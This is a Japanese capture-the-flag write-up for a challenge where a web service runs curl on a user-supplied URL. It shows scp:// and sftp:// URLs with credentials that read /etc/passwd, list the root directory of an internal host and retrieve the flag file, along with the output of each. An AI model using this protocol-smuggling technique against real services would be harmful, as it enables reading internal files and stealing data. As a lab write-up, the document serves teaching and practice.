# curl as a service

## / Overview

curlのsftp, scpを使ったリモートファイル窃盗

## / Writeup

Dockerで`frontend`と`secret`というサーバが建てられています。ユーザは`frontend`のWebサイトから`curl --silent --show-error --insecure <URL>`を実行できます。入力できるのは`<URL>`の部分だけで、`secret`にある`/flag-xxx`を表示させなければなりません。`xxx`は予測不可能な文字列です。

普段`curl`は`http`や`https`のサイト情報を取得するために使いますが、実は色々なプロトコルに対して使用することができます。

```
DICT, FILE, FTP, FTPS, GOPHER, GOPHERS, HTTP, HTTPS, IMAP, IMAPS, LDAP, LDAPS, MQTT, MQTTS, POP3, POP3S, RTSP, SCP, SFTP, SMB, SMBS, SMTP, SMTPS, TELNET, TFTP, WS and WSS
```

この中に、`secret`サーバで許可されている22番ポートで通信するものが2つあります。それが`sftp`と`scp`です。これらはファイルをやり取りするプロトコルなので上手く使うことでフラグが見れるかも知れません。

`secret`には`alpaca`というユーザで`hack`というパスワードを使えばログインできるのですが、どの様にURLの中に組み込めば良いのでしょうか。`scp`では`scp://<userinfor>@<host>:<port>/<scp-path>`という形式で接続できるという情報を見つけました[[1]](https://www.seil.jp/doc/index.html#fn/ssh/scp.html)。これで試しに`/etc/passwd`を指定してみましょう。

```sh
URL: scp://alpaca:hack@secret:22//etc/passwd

Output:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
sshd:x:997:65534:sshd user:/run/sshd:/usr/sbin/nologin
alpaca:x:1000:1000::/home/alpaca:/bin/sh
```

これで正しいことが分かったので次は`ls`に相当するコマンドをルートディレクトリで実行する方法がないか調べてみます。これは`sftp`でディレクトリを指定すると可能であることが分かりました。

```sh
URL: sftp://alpaca:hack@secret:22//

Output:
drwxr-xr-x    2 root     root         4096 Apr  6 00:00 opt
drwxr-xr-x    1 root     root         4096 May 14 14:30 .
lrwxrwxrwx    1 root     root            7 Mar  2 21:50 bin -> usr/bin
drwxr-xr-x    1 root     root         4096 Apr  6 00:00 usr
drwx------    1 root     root         4096 May 11 16:55 root
drwxr-xr-x    1 root     root         4096 May 14 14:30 ..
drwxr-xr-x    2 root     root         4096 Apr  6 00:00 media
drwxr-xr-x    2 root     root         4096 Apr  6 00:00 mnt
drwxr-xr-x    5 root     root          340 May 14 14:30 dev
lrwxrwxrwx    1 root     root            8 Mar  2 21:50 sbin -> usr/sbin
dr-xr-xr-x  377 root     root            0 May 14 14:30 proc
drwxr-xr-x    1 root     root         4096 May 14 14:30 etc
drwxrwxrwt    1 root     root         4096 May 11 16:55 tmp
drwxr-xr-x    2 root     root         4096 Apr  6 00:00 srv
drwxr-xr-x    2 root     root         4096 Mar  2 21:50 home
drwxr-xr-x    2 root     root         4096 Mar  2 21:50 boot
lrwxrwxrwx    1 root     root            9 Mar  2 21:50 lib64 -> usr/lib64
drwxr-xr-x    1 root     root         4096 Apr  6 00:00 var
dr-xr-xr-x   13 root     root            0 May  3 07:00 sys
drwxr-xr-x    1 root     root         4096 May 15 05:47 run
lrwxrwxrwx    1 root     root            7 Mar  2 21:50 lib -> usr/lib
-rwxr-xr-x    1 root     root            0 May 14 14:30 .dockerenv
-rw-r--r--    1 root     root           73 May 11 16:54 flag-129e7c8c104ae0b42cdfc6a9566ef0f1.txt
```

フラグのファイル名が分かったので`scp`で抽出します。

```sh
URL: scp://alpaca:hack@secret:22//flag-129e7c8c104ae0b42cdfc6a9566ef0f1.txt

Output:
Alpaca{Without_--insecure_option_we_need_to_modify_the_known_hosts_file}
```